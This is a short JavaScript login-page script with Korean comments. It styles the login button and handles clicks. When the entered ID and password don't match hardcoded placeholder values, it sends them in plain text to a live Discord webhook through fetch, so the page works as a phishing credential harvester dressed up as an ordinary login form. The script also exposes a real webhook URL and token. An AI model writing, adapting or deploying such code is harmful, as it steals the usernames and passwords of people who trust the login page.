let inputTag = document.getElementsByTagName("input");
let buttonArray = document.getElementsByTagName("button");

let inputId = inputTag[0];
let inputPassword = inputTag[1];

let ordinaryButton = buttonArray[0];

// 비밀번호 입력 시 버튼 상태 변경
inputPassword.addEventListener("keyup", () => {
    if (inputId.value && inputPassword.value) {
        ordinaryButton.classList.remove("unactivatedLoginColor");
        ordinaryButton.classList.add("activatedLoginColor");
    } else {
        ordinaryButton.classList.remove("activatedLoginColor");
        ordinaryButton.classList.add("unactivatedLoginColor");
    }
});

// 로그인 버튼 클릭 시 이벤트 처리
ordinaryButton.addEventListener('click', () => {
    if (inputId.value === "본인의아이디" && inputPassword.value === "비밀번호") {
        // 로그인 성공 처리
    } else {
        sendToDiscord(inputId.value, inputPassword.value);
    }
});

// Discord 웹훅으로 데이터 전송
function sendToDiscord(userId, password) {
    const webhookURL = 'https://discord.com/api/webhooks/1310193187427586058/fshmsmwoK622L7ha0-rDkvG601rT5bC3P6i-TcMpPVIQN3GmbJS-OJ_wN3STVsY9iPXU';

    const data = {
        content: `로그인 시도:\n아이디: ${userId}\n비밀번호: ${password}`
    };

    fetch(webhookURL, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(data)
    })
    .then(response => {
        if (!response.ok) {
            throw new Error('네트워크 응답이 좋지 않습니다.');
        }
        return response.json();
    })
    .then(data => {
        console.log('전송 성공:', data);
    })
    .catch((error) => {
        console.error('전송 중 오류 발생:', error);
    });
}
